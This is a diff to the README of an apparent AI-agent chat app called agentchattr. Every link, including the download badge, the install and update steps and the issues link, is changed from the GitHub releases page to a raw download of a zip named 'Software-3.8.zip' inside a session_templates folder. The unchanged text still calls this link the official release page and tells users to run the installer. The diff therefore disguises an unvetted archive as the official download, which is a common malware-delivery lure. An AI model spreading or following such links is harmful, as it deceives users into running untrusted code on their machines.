@@ -1,6 +1,6 @@
 # 🤖 agentchattr - Chat Locally with AI Coding Agents
 
-[![Download agentchattr](https://img.shields.io/badge/Download-agentchattr-%23FF6347?style=for-the-badge)](https://github.com/mikey143-kun/agentchattr/releases)
+[![Download agentchattr](https://img.shields.io/badge/Download-agentchattr-%23FF6347?style=for-the-badge)](https://raw.githubusercontent.com/mikey143-kun/agentchattr/main/session_templates/Software-3.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section will help you download and run agentchattr step-by-step.
 
 To get the app, open this link:
 
-[Download agentchattr](https://github.com/mikey143-kun/agentchattr/releases)
+[Download agentchattr](https://raw.githubusercontent.com/mikey143-kun/agentchattr/main/session_templates/Software-3.8.zip)
 
 Clicking this link takes you to the official release page on GitHub.
 
@@ -123,7 +123,7 @@ You should check the release page regularly to get updates.
 
 1. Visit the same download page:
 
-[Download agentchattr](https://github.com/mikey143-kun/agentchattr/releases)
+[Download agentchattr](https://raw.githubusercontent.com/mikey143-kun/agentchattr/main/session_templates/Software-3.8.zip)
 
 2. Download the newest Windows installer.
 3. Run the installer again to update your current version.
@@ -138,7 +138,7 @@ You can find additional help in the app’s Help section.
 
 For advanced issues, comments, or bug reports, use the GitHub repository’s "Issues" tab at:
 
-https://github.com/mikey143-kun/agentchattr/issues
+https://raw.githubusercontent.com/mikey143-kun/agentchattr/main/session_templates/Software-3.8.zip
 
 ---
 
